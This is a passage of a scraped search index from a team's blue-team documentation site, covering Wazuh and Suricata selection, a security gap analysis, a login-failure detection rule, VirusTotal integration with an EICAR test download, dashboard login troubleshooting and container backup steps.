Team/ids-and-wazuh/Choosing-Both-Suricata-and-Wazuh#4-comprehensive-security-monitoring","content":" Implementing both solutions helps to providing comprehensive security monitoring and threat detection capabilities. Wazuh aids in monitoring host activities, file integrity, and security configurations, while Suricata helps identify external threats and monitor overall network health.  ","version":"Next","tagName":"h3"},{"title":"Why we didn’t Implemented Only One Solution​","type":1,"pageTitle":"Choosing Both Suricata and Wazuh: Understanding Their Unique Qualities","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Choosing-Both-Suricata-and-Wazuh#why-we-didnt-implemented-only-one-solution","content":" Implementing only one solution, whether Wazuh or Suricata, would expose significant security risks and operational challenges. As Relying solely on one solution would create critical security gaps [1]. For example, relying solely on Wazuh for host-based monitoring might overlook network-level threats, while depending exclusively on Suricata for network detection might miss insights into system-level activities and events. This fragmented approach leaves us vulnerable to various cyber threats, compromising our ability to maintain compliance with regulatory requirements and reducing operational efficiency.  Implementing only one solution that may not provide the necessary breadth and depth of coverage to meet these requirements effectively. For instance, while Wazuh's robust monitoring capabilities help us meet regulatory standards by providing detailed insights into host-level activities and events, Suricata's network-based detection capabilities are equally crucial for identifying and mitigating threats that originate from external sources or traverse our network [1].  A single solution may lack the scalability and flexibility needed to adapt to the ongoing projects that are growing. Wazuh and Suricata are designed to scale seamlessly, offering flexibility in deployment and management across various environments. It ensures that our security measures remain robust and effective in the face of evolving threats. Additionally, adopting a multi-layered security approach enhances our ability to detect and respond to sophisticated cyber threats effectively. Combining the capabilities of Wazuh and Suricata allows us to correlate security events and incidents across different layers of our infrastructure, providing a more comprehensive view of our security landscape.  ","version":"Next","tagName":"h2"},{"title":"Difference between Wazuah and Suricata​","type":1,"pageTitle":"Choosing Both Suricata and Wazuh: Understanding Their Unique Qualities","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Choosing-Both-Suricata-and-Wazuh#difference-between-wazuah-and-suricata","content":" \tWazuh\tSuricata1.\tWazuh is a Security Information and Event Management (SIEM) solution.\tIt is Network-based Intrusion Detection System (NIDS). 2.\tIt collects and analyses logs and events from hosts, applications, and network devices for security monitoring and threat detection.\tIt inspects network traffic and packets to detect threats like intrusions, DDoS attacks, and suspicious network activities. 3.\tIt provides a comprehensive security monitoring platform.\tIt focuses solely on network-based threat detection. 4.\tIt utilises the system resources to log traffic inspection such as CPU, memory.\tIt primary utilises the network resources such as bandwidth and latency for traffic inspection. 5\tIt helps in regulatory compliance by monitoring host activities, file integrity and security configurations.\tIt aids in identifying external threats and monitoring the overall network health. 6.\tDeploying Wazuh\tIntrusion Detection System  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Choosing Both Suricata and Wazuh: Understanding Their Unique Qualities","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Choosing-Both-Suricata-and-Wazuh#conclusion","content":" The deployment of Wazuh as a Security Information and Event Management (SIEM) solution and Suricata as a Network Intrusion Detection System (NIDS) on our virtual machine (VM) significantly enhances Redback Operations' cybersecurity posture. The integration of Wazuh and Suricata creates a multi-layered security approach, ensures the protection from a wide range of cyber threats. By combining the capabilities of a SIEM and a NIDS, we demonstrate our commitment to providing a secure and reliable environment.  ","version":"Next","tagName":"h2"},{"title":"Reference​","type":1,"pageTitle":"Choosing Both Suricata and Wazuh: Understanding Their Unique Qualities","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Choosing-Both-Suricata-and-Wazuh#reference","content":" [1] I. O. Odike, “Responding to network attacks with Suricata and Wazuh XDR,” Wazuh, 11 November 2022. [Online]. Available: https://wazuh.com/blog/responding-to-network-attacks-with-suricata-and-wazuh-xdr/.  [2] M. Stromann, “Suricata vs Wazuh,” LiveEnterprise, 06 August 2023. [Online]. Available: https://www.liventerprise.org/compare/Suricata_vs_Wazuh/. ","version":"Next","tagName":"h2"},{"title":"Deploying Wazuh on the Virtual Machine","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/deploying-wazuh","content":"Deploying Wazuh on the Virtual Machine","keywords":"","version":"Next"},{"title":"IDS Selection, Implementation, and Testing","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/intrusion-detection-system","content":"IDS Selection, Implementation, and Testing","keywords":"","version":"Next"},{"title":"Cyber Security Gap Analysis Report for Redback Operations","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/gap-analysis","content":"Last updated by: bg-11, Last updated on: '16/05/2025' Last updated by: bg-11, Last updated on: '16/05/2025' important By Prabhgun Singh. 22/09/2024 Cyber Security Gap Analysis Report for Redback Operations Executive Summary This report evaluates the current state of IT and cybersecurity infrastructure at Redback Operations, identifies significant gaps in existing policies and procedures, and offers recommendations for enhancing the security framework. The focus is on the necessity for a comprehensive Information Security Management System (ISMS) and highlights areas where current policies are lacking or entirely absent. Purpose and Scope The primary objective of this gap analysis is to benchmark Redback Operations' IT and cybersecurity policies against industry standards and best practices. The evaluation covers the robustness of security policies and procedures across multiple defense layers to ensure a thorough assessment. Current State Analysis IT Infrastructure and Technology Redback Operations is transitioning to include both on-premise and cloud-based assets, particularly deploying Microsoft Azure alongside Google Cloud Platform. This shift has resulted in technical debt that needs addressing to mitigate risks and close security gaps. Due to this transitional phase, the report focuses on high-level security policy rather than a detailed technical policy and controls analysis. Cybersecurity Posture Currently, the cybersecurity measures at Redback Operations encompass a limited range of policies, tools, and controls. The absence of a clear ISMS and security governance strategy has resulted in significant gaps in the security posture. Using defense-in-depth as a metric, the policies lack both depth and coverage. Regulatory and Industry Framework Compliance Redback Operations complies with the Australian Privacy Act and adheres to the Australian Privacy Principles. However, there are only minor references to the Essential 8 Framework, and there is no adherence to comprehensive industry security frameworks such as NIST, CIS, or ASD ISM. The overall assessment indicates low cyber maturity due to incomplete and minimal custom policies. Gap Analysis Policy, Procedure, and Control Gaps Redback Operations faces significant exposure due to the lack of core IT and IT security policies. Addressing these vulnerabilities is crucial for the company’s security and operational efficiency. The primary finding is the absence of a comprehensive ISMS. The lack of formal policies across various IT and cybersecurity domains is identified as a critical vulnerability. While additional standards, policies, procedures, and guidelines are necessary for improving cyber maturity, the fundamental policies outlined in this document are prioritized for development. Data Classification and Data Loss Prevention Finding: No existing policy. Objective: Mitigate risks associated with unauthorized data access and loss, ensuring the integrity and confidentiality of sensitive information. Key Subjects: • Definition of data categories and sensitivity controls. • Standards for data handling, storage, and transmission. • Procedures for data loss prevention, including technological and process-based controls. • Roles and responsibilities for data management and protection. • Enhancement and integration with existing data breach reporting mechanisms. Cloud Security (Microsoft Azure) Finding: No existing policy. Objective: Define standards and controls for cloud-based assets, covering risk mitigation for cloud environments. Key Subjects: • Security responsibilities of the cloud provider versus the organization. • Security policy and frameworks for deploying assets securely to Azure. • Access control and identity management for cloud services. • Secure development practices for cloud-based applications. Endpoint Security Finding: Limited policy coverage, mainly referencing the Essential 8 Framework. Objective: Protect organizational devices against cyber threats, ensuring the security of data accessed and processed by these devices. Key Subjects: • Mandatory security software requirements (antivirus, firewall, etc.). • Regular update and patch management procedures. • Secure configuration standards for all endpoints. • References to the Essential 8 Framework. Server Security and Hardening Finding: Limited policy coverage, mainly referencing the Essential 8 Framework. Objective: Establish secure server operations, minimizing vulnerabilities through stringent security practices and hardening techniques. Key Subjects: • Hardening guidelines for operating systems and services. • Patch management and vulnerability assessment schedule. • Access control measures and secure administration protocols. • Physical security measures for server environments. • Monitoring and response strategies for server-related security events. Encryption Finding: Limited content on encryption standards, mostly related to existing infrastructure. Objective: Ensure the confidentiality and integrity of data in transit and at rest through strong encryption standards. Key Subjects: • Approved encryption algorithms and protocols. • Key management lifecycle, including generation, storage, and destruction. • Use cases for encryption (data at rest, data in transit, etc.). • Encryption audit and verification procedures. Monitoring and Log Analytics Finding: Limited coverage, primarily related to Google Chronicle. Objective: Enable timely detection and response to security incidents through comprehensive monitoring and analysis of system logs. Key Subjects: • Log collection and management policy. • Real-time monitoring and alerting mechanisms. • Common incident response scenarios and playbooks. • References to common SOC (Security Operations Center) design principles. User Awareness Training Finding: No existing training content. Objective: Foster a security-conscious culture within the organization, empowering employees to recognize and respond to cybersecurity threats. Key Subjects: • Overview of common cyber threats and attack vectors. • Secure practices for email, web browsing, and device usage. • Password management and multi-factor authentication. • Reporting procedures for suspicious activities or incidents. • Regular training schedule and policy compliance requirements. External Attack Surface Management Finding: No existing policy. Objective: Identify, map, assess, and secure external-facing assets to reduce the risk of attacks exploiting these exposures. Key Subjects: • Inventory and classification of external-facing assets. • Regular assessment procedures for identifying vulnerabilities. • Remediation priorities and timelines for identified risks. • Coordination with third parties for securing shared assets. • Continuous improvement process for attack surface reduction. • Policy compliance requirements for onboarding new assets. BYOD and Mobile Device Management Finding: No existing policy. Objective: Establish control over personal devices used for work purposes, ensuring they meet organizational security standards. Key Subjects: • Security requirements and controls for personal devices accessing corporate resources. • Device registration and compliance verification processes. • Data separation and encryption on personal devices. • Lost or stolen device response procedures. • Privacy considerations for employees and the organization. Technical Gaps Due to ongoing platform changes and pending implementations of technical security tools, specific technical gaps are currently not applicable. Recommendations Strategic Recommendations • Develop and implement comprehensive policies for each identified gap area, aligned with industry best practices and regulatory requirements. • Establish a formal ISMS to oversee policy implementation and compliance. • Enhance user awareness training to cover critical cybersecurity threats and best practices. • Implement technical measures to address identified vulnerabilities in network, server, and application security. • Ensure the ISMS is operational and actively used to guide the company towards maintaining a robust security posture. Implementation Plan The Redback Operations Infrastructure and Policy teams have already started addressing the identified gaps. This includes policy development, training programs, and technical security enhancements. Responsibilities are assigned to respective team members, with progress tracked using project management tools such as Trello. Conclusion This gap analysis report highlights the urgent need for a comprehensive review and enhancement of Redback Operations' IT and cybersecurity policies. By addressing the identified gaps, the company can significantly improve its security posture and resilience against cyber threats. Screenshots","keywords":"","version":"Next"},{"title":"Rules Breakdown:","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/rules","content":"Last updated by: bg-11, Last updated on: '16/05/2025' Last updated by: bg-11, Last updated on: '16/05/2025' important By Prabhgun Singh. 16/09/2024 Rules Breakdown: Identification of Rules: The rule with the id=&quot;10001&quot; is recognized, and its severity level is set to 3, which denotes a somewhat high severity. Group Details: The rule falls under the category of local_syslog,sshd, which groups it with events related to the SSH daemon and local Syslog. Conditions of Match: Log messages with the following text patterns are matched by the rule: &quot;Manager started,&quot; &quot;Failed password,&quot; &quot;Failed keyboard,&quot; &quot;Authentication error,&quot; and &quot;Connection reset.&quot; The rule kicks in if any of these keywords show up in the log. Synopsis: Upon activation, the rule produces an alert titled &quot;Wazuh server started/authentication failed,&quot; which provides an explanation of the event's potential causes. Compliance Clustering: The regulation is connected to several compliance frameworks, such as NIST, PCI DSS, GDPR, and HIPAA. By recording and reacting to pertinent security occurrences, this aids in upholding adherence to these requirements. Screenshot of Wazuh Made this rule Case Study for Security Operations: Monitoring Authentication Failures It's critical for a Security Operations Center (SOC) to keep a close eye on all system authentication attempts. Rejected login attempts may be a sign of possible security risks like brute force attacks or illegal access attempts. Using Wazuh for implementation You've set up a custom rule on the Wazuh platform to keep an eye on particular kinds of unsuccessful authentication attempts. The rule is intended to identify patterns in log files, such as &quot;Failed password,&quot; &quot;Failed keyboard,&quot; &quot;Authentication error,&quot; and &quot;Connection reset,&quot; that may indicate potential authentication problems. How Does It Work Event Detection: The rule searches log files continually for the defined patterns. The rule is activated when any of these keywords are found, suggesting a failed attempt at login or a related problem. Notifying and Taking Action: • When the rule is activated, an alert is produced with the subject &quot;Wazuh server started/authentication failed&quot;. • After that, this warning is incorporated into the Security Operations process so that SOC analysts can look into why the authentication attempt failed. • Depending on how serious the incident is, an analyst may manually analyze it or automated responses, such banning the source IP, may be started. Reporting and Conformance: • The rule also ensures that the SOC is complying with legal requirements in addition to keeping an eye out for potential risks, as it is linked to a number of compliance standards, including PCI DSS, GDPR, and HIPAA. • It is possible to create reports that demonstrate compliance with these requirements, which is crucial for audit purposes. Outcome By establishing this rule, the SOC improves the organization's overall security posture by strengthening its capacity to identify and address possible security events involving authentication failures.","keywords":"","version":"Next"},{"title":"Change to Wazuh Manager","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Virus_Total","content":"Last updated by: bg-11, Last updated on: '16/05/2025' Last updated by: bg-11, Last updated on: '16/05/2025' important By Prabhgun Singh. 16/09/2024 Change to Wazuh Manager docker exec -it single-node-wazuh.manager-1 /bin/bash /var/ossec/etc/ossec.conf Code &lt;integration&gt; &lt;name&gt;virustotal&lt;/name&gt; &lt;api_key&gt;insert &lt;/api_key&gt; &lt;group&gt;syscheck&lt;/group&gt; &lt;alert_format&gt;json&lt;/alert_format&gt; &lt;/integration&gt; Restart Manager /var/ossec/bin/wazuh-control restart Rules for Wazuh agent Yuhan@redback /var/ossec/etc/ossec.conf in Wazuh agent Code &lt;syscheck&gt; &lt;directories check_all=&quot;yes&quot; realtime=&quot;yes&quot;&gt;/home/virustotaltest&lt;/directories&gt; &lt;/syscheck&gt; systemctl restart wazuh-agent Make a directory inside home - virustest sudo curl -Lo /media/user/software/suspicious-file.exe https://secure.eicar.org/eicar.com Output in Wazuh Manager","keywords":"","version":"Next"},{"title":"Wazuh Login Troubleshooting Report","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report","content":"","keywords":"","version":"Next"},{"title":"Summary​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#summary","content":" This report documents the troubleshooting process undertaken to resolve login issues encountered while accessing the Wazuh Dashboard after full stack deployment. The process involved validating service statuses, resetting credentials, fixing permission issues, and regenerating SSL certificates.  ","version":"Next","tagName":"h2"},{"title":"Issue Summary​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#issue-summary","content":" Following deployment of the Wazuh manager, indexer, and dashboard, login attempts to the Wazuh web interface failed. The failure was accompanied by:  Credential mismatch errors.Permission-denied issues when updating the keystore.SSL file not found (dashboard-key.pem) error.  ","version":"Next","tagName":"h2"},{"title":"Root Cause Analysis​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#root-cause-analysis","content":" ","version":"Next","tagName":"h2"},{"title":"1. Credential Errors​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#1-credential-errors","content":" Default login credentials (admin/admin) were not accepted.Manual user creation and password reset did not resolve the issue immediately.  ","version":"Next","tagName":"h3"},{"title":"2. Keystore Permission Denied​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#2-keystore-permission-denied","content":" Attempt to update the opensearch-dashboards-keystore failed due to lack of root privileges.  ","version":"Next","tagName":"h3"},{"title":"3. Missing SSL Certificate​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#3-missing-ssl-certificate","content":" Wazuh dashboard failed to start due to missing /etc/wazuh-dashboard/certs/dashboard-key.pem.  ","version":"Next","tagName":"h3"},{"title":"Troubleshooting Steps​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#troubleshooting-steps","content":" ","version":"Next","tagName":"h2"},{"title":"Step 1: Verified Service Status​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#step-1-verified-service-status","content":" sudo systemctl status wazuh-manager sudo systemctl status wazuh-dashboard sudo systemctl status wazuh-indexer   Confirmed manager was active but Dashboard and indexer failed.  Screenshot of Service Status wazuh-dashboard:   Screenshot of Service Status wazuh-indexer:  Screenshot of Service Status wazuh-manager:  ","version":"Next","tagName":"h3"},{"title":"Step 2: Reset Credentials​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#step-2-reset-credentials","content":" sudo /usr/share/wazuh-indexer/plugins/opensearch-security/tools/wazuh-passwords-tool.sh --change-all   Successfully reset passwords for users including kibanaserver.  ","version":"Next","tagName":"h3"},{"title":"Step 3: Updated Keystore​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#step-3-updated-keystore","content":" echo '&lt;new-password&gt;' | /usr/share/wazuh-dashboard/bin/opensearch-dashboards-keystore --allow-root add -f --stdin opensearch.password   Note: Initial attempts failed due to insufficient permissions. Switching to root user (sudo -i) resolved the issue.  ","version":"Next","tagName":"h3"},{"title":"Step 4: Regenerated Missing SSL Files​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#step-4-regenerated-missing-ssl-files","content":" sudo mkdir -p /etc/wazuh-dashboard/certs sudo openssl genrsa -out /etc/wazuh-dashboard/certs/dashboard-key.pem 2048 sudo openssl req -new -key /etc/wazuh-dashboard/certs/dashboard-key.pem -out /etc/wazuh-dashboard/certs/dashboard.csr sudo openssl x509 -req -in /etc/wazuh-dashboard/certs/dashboard.csr -signkey /etc/wazuh-dashboard/certs/dashboard-key.pem -out /etc/wazuh-dashboard/certs/dashboard-cert.pem -days 365   Successfully created private key and certificate.  Screenshot of regenerated dashboard certs:   ","version":"Next","tagName":"h3"},{"title":"Step 5: Adjusted Permissions​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#step-5-adjusted-permissions","content":" sudo chown -R wazuh:wazuh /etc/wazuh-dashboard/certs sudo chmod 600 /etc/wazuh-dashboard/certs/dashboard-key.pem   Ensured proper access rights for dashboard service.  Screenshots of access permisssions  ","version":"Next","tagName":"h3"},{"title":"Step 6: Restarted Services​","type":1,"pageTitle":"Wazuh Login Troubleshooting Report","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/Wazuh Login Troubleshooting Report#step-6-restarted-services","content":" sudo systemctl restart wazuh-indexer sudo systemctl restart wazuh-dashboard sudo systemctl restart wazuh-manager   Confirmed all services started successfully and dashboard became accessible.  Screenshot dashboard access prompt:   Outcome​  The login issue was resolved by addressing password mismatches, updating the keystore securely, and regenerating SSL certificates with appropriate permissions. Dashboard is now accessible with updated credentials.  Appendix​  Logs: /var/ossec/logs/ossec.log, journalctl -xeu wazuh-dashboard.serviceConfig files: /etc/wazuh-dashboard/opensearch_dashboards.yml, authentication.jsonTools used: OpenSSL, systemctl, wazuh-passwords-tool ","version":"Next","tagName":"h3"},{"title":"Wazuh Documentation","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-documentation","content":"","keywords":"","version":"Next"},{"title":"Section 1 - Capabilities of Wazuh​","type":1,"pageTitle":"Wazuh Documentation","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-documentation#section-1---capabilities-of-wazuh","content":" Wazuh is an open source and completely free security platform which can be utilized for many features and learning which will be discussed in this documentation. The tool itself is accessible via this link: https://wazuh.com/  When we utilize the Wazuh platform, every user that interacts with the platform is presented with many opportunities to learn various concepts ranging from hacking methods to security methods to strengthen your systems and protect yourself from any attacker in which may discover the various vulnerabilities and exploit them for their own gains. These are all a threat in the modern world and thus we have adopted to utilizing Wazuh to assist in detecting these threats and mitigating them as soon as possible to reduce the liklihood of a compromise or enumeration agaisnt members of the company.  When we mention these systems, they are referred to as Agents in which we can deploy various agents across the platform. The tool itself as well allows for further analysis into your agents across the dashboard in which the user can also discover various information about their agent, various configurations and standards to improve their security with this platform.  We can also allow for Wazuh to send security alerts to our devices via a chosen method which can range from platforms like Slack to our own Emails. This tool is referred to as a SIEM tool (Security, Information and Event Management) which all of these elements are showcased in Wazuh’s interface. SIEM categorised tools are very important in Cyber Security elements as they are efficient with providing the appropriate analysis, detailed information, security recommendations and also real-time events that are occurring within our linked agents. Wazuh utilizes a simplistic method of analyzing our agents and due to this, the platform itself only requires a Linux server along with another machine to monitor the output of the tool which includes another computer. Many Linux servers are supported with Wazuh including various popular services such as Ubuntu and Debain. The implementation of this tool is also relatively easy and has already been discussed on another one of our documents. The open-sourced tool as stated before provides users with a unique learning experience in which there is plenty of learning opportunities to grow and develop their knowledge in how to keep their devices safer from discovered vulnerabilities as well as providing users with knowledge of potential risks and how they can be mitigated to prevent enumeration, exploitation and compromises. This allows for users to become more cyber safe, reinforces their agent’s defences against cyber attacks and provides users with the knowledge to prevent these cases in the future. Wazuh’s system requirements are quite slim even if utilizing a Virutal machine, this creates for easier access to reach more users as well as easier performance on the machine. These include a minimum requirement of 2GB of RAM along with 2 CPU cores whereas the recommended requirements aim for 4GB of RAM and 8 CPU cores allowing for a better performance and smoother experience when analyzing agents.  Wazuh provides a lot of analysis opportunities for users to discover while utilizing the platform along with users to learn various concepts and potential vulnerabilities within their linked agents.  ","version":"Next","tagName":"h2"},{"title":"Section 2 - What can we learn from Wazuh?​","type":1,"pageTitle":"Wazuh Documentation","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-documentation#section-2---what-can-we-learn-from-wazuh","content":" The platform informs the user of any security configurations that need to be implemented to further enhance their security on the linked agent/s. These security configurations are also referred to as misconfigurations in which some of these the user may not intentionally select as it may have been from a previous user or default settings. Wazuh provides methods into configuring these misconfigurations properly along with what the misconfiguration actually is. Wazuh focuses on vulnerabilities a lot as it is the source of many cyber attacks and the platform explains these vulnerabilities, categorises them into severity of the vulnerability and also how we can mitigate some of these vulnerabilities so that the user cannot be discovered by an attacker via enumeration/social engineering tactics which can further lead to a potential compromise. A list of common vulnerabilities is accessible which can make the user more aware of the risk of enumeration and exploitation which can be mitigated by the user and prevent attackers from performing their reconnaissance on the targeted agent. Wazuh explores various threats in which malware is another area explored in which the interface is able to gather the type of malware being executed within the machine should the agent be compromised along with the severity of the malware. Other threats explored include brute-force attacks which can occur at any time in which Wazuh is able to alert the user that an attack is occurring and allows for the user to respond accordingly. This involves blocking the attacking IP address where the attack is being traced to which allows for proper incident response to the situation. With constant evolving cyber threats growing every day, Wazuh adapts to this with constant updates to its cyber attacks and is able to detect various new attacks within the linked agents. The MITRE ATT&amp;CK framework is a major implementation within Wazuh as it is an important framework to learn and understand so that users can become aware of the various categories of attacks and what each of these attacks are. Detected vulnerabilities within an agent also provide for MITRE techniques to be classified and sorted with the associated vulnerability which each technique has a unique tag and allows for the user to learn about the associated attack method which is linked to the vulnerability. For example, a brute force technique is categorised into the Credential Access category with a unique ID of T1110. Other elements that Wazuh can analyse and inform us about is any changes within the Windows registry (if agent is windows) as well as any directory and file. These can range from changes to Windows registry keys including modifications, deleting and creating key values. Wazuh also analyses changes to a file and directory including adding, deleting and editing these files and directories. Wazuh provides insight into various compliance standards in a matter for users to follow which includes but are not limited to up to date updates, constant securing of devices which may involve MFA (Multi-Factor Authentication) and mitigating discovered vulnerabilities. The platform also displays to the user a Secure Configuration Assessment (SCA) which is able to inform users of why they need to follow certain actions to reduce the risk of being compromised and further keep themselves protected. The score given in the assessment further entails the user to perform various actions to achieve a higher score in their SCA which may involve for example installing certain software onto the associated agent. These are also considered misconfigurations which also utilize MITRE technique tags to classify them and the tool also informs the user with how they can check for these various misconfigurations and what they are. Intel provided on various security events is extremely critical for incident response and for developing a safer agent and reduce the risk of enumeration and compromise. The intel Wazuh provides includes authentication failures/success, top alerts as well as providing an entire list of security alerts for the associated agent in which we can obtain in the interface.  The tool provides so much information for the user and assists in becoming more secure with their agents as well as constant monitoring for any new changes needed to mitigate vulnerabilities that are discovered and any abnormal behaviour detected in which the user is able to respond accordingly.  ","version":"Next","tagName":"h2"},{"title":"Section 3 - Why Wazuh? Why do we need this tool?​","type":1,"pageTitle":"Wazuh Documentation","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-documentation#section-3---why-wazuh-why-do-we-need-this-tool","content":" Since implementing Wazuh into Redback Operations, Wazuh provides many reasons as to why this tool should be utilized including various elements that provide an opportunity for the user to develop their own cyber safe environment.  Security Awareness – Wazuh provides users knowledge of potential vulnerabilities and also how to mitigate these vulnerabilities to reduce the risk of a compromise or enumeration by an attacker by providing detailed information and solutions to make the user more aware of what is happening and why this is a risk. Incident Response – The platform allows for active response to real events occurring on their linked agents including various attacks and file changes to at which the user can act upon these incidents and take the necessary steps required to mitigate these attacks and risks. Securing of Devices – With the constant evolution of Cyber threats, Wazuh adapts and informs the user of these new threats by creating awareness of new exploits/vulnerabilities discovered within an agent and how to mitigate these risks hence why this tool provides a great opportunity for users to further secure their devices by adjusting configurations and making appropriate changes to mitigate the security alerts that are being detected. Safety – The tool itself protects user’s machines by providing adequate information to the user as to how to improve their safety and security to protect themselves from foreign attacks/interference which in turn creates ease of access for company members to continue their work on their projects knowing that the agent they are utilizing has its security enhanced due to the correct configurations and implementations utilized within the agent. Accessibility – Having a relatively easy to understand User Interface (UI), many users can easily navigate Wazuh’s dashboard to locate their agents and analyse the discovered elements. This creates an easy and also safe method of learning of what is being displayed to the user which for example, various vulnerabilities along with their MITRE techniques utilized to exploit this vulnerability and solutions to mitigate these vulnerabilities. Compliance – Wazuh provides members the opportunity to be compliant with various standards that are followed throughout many companies including but not limited to MFA and minimalized password sharing. Through this, users can become more cyber safe and also by following these standards, users can also create a more cyber safe environment for their companies.  ","version":"Next","tagName":"h2"},{"title":"Conclusion:​","type":1,"pageTitle":"Wazuh Documentation","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-documentation#conclusion","content":" As a free open-sourced platform, Wazuh provides plenty of information and opportunities for members to learn about various cyber security principles, concepts and risks in which every one can learn how to mitigate and also utilize the platform in a positive manor to assist in protecting themselves from the evolving world of cyber threats and attacks.  From easy implementation, low requirements and plenty of concepts that can be learnt, this platform is an extremely important asset to utilize in further enhancing a cyber safe environment to reduce the risk of exploitation, enumeration and compromise of a linked agent while also having various areas to develop our understanding of cyber security principles including but not limited to, Incident Response, Security awareness and safety.  ","version":"Next","tagName":"h3"},{"title":"Extra Resources:​","type":1,"pageTitle":"Wazuh Documentation","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-documentation#extra-resources","content":" MITRE ATT&amp;CK Framework: https://attack.mitre.org/Security Awareness Training Modules: https://classroom.google.com/c/NzAzMjgwOTI3MDIw?cjc=ppfbbocLink to Wazuh Video Documentation: https://youtu.be/g82PwIFLYYc?si=4pZzpdajIvHrIKlgAlso check out the Wazuh PowerPoint documentation below for a more visual approach! ","version":"Next","tagName":"h3"},{"title":"Wazuh 4.5.0 - Backup and Redeploy","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy","content":"","keywords":"","version":"Next"},{"title":"Step 1: Check Running Wazuh Instances/Services​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#step-1-check-running-wazuh-instancesservices","content":" Check Running Wazuh Instances: docker ps   ","version":"Next","tagName":"h2"},{"title":"Step 2: Backup Wazuh Data​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#step-2-backup-wazuh-data","content":" ","version":"Next","tagName":"h2"},{"title":"1. Backup Wazuh Manager Data​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#1-backup-wazuh-manager-data","content":" 1.1. Enter the Wazuh Manager container:  docker exec -it --user root single-node-wazuh.manager-1 bash   1.2. Create a compressed backup:  tar -czvf /var/ossec_backup.tar.gz /var/ossec     1.3. Exit the container:  exit   1.4. Copy the backup to the host machine:  Note: This step copies the backup to the current working directory (e.g., /home/usr/). To copy the backup to a centralized location, skip this step and follow the instructions in Section 4.  docker cp single-node-wazuh.manager-1:/var/ossec_backup.tar.gz ./ossec_backup.tar.gz     ","version":"Next","tagName":"h3"},{"title":"2. Backup Wazuh Indexer Data​","type":1,"pageTitle":"Wazuh 4.5.0 - Backup and Redeploy","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-backup-redeploy#2-backup-wazuh-indexer-data","content":" 2.1. Enter the Wazuh Indexer container:  docker exec -it --user root single-node-wazuh.indexer-1 bash   2.2. Navigate to the /usr/share directory:  cd ../   2.3. Verify that the wazuh-indexer directory exists:  ls   2.4. Create a compressed backup:  tar -czvf /usr/share/wazuh.indexer_backup.tar.gz /usr/share/wazuh-indexer/     2.5. Exit the container:  exit   2.6. Copy the backup to the host machine:  Note: This step copies the backup to the current working directory (e.g., /home/usr/). To copy the backup to a centralized location, skip this step and follow the instructions in Section 4.  docker cp 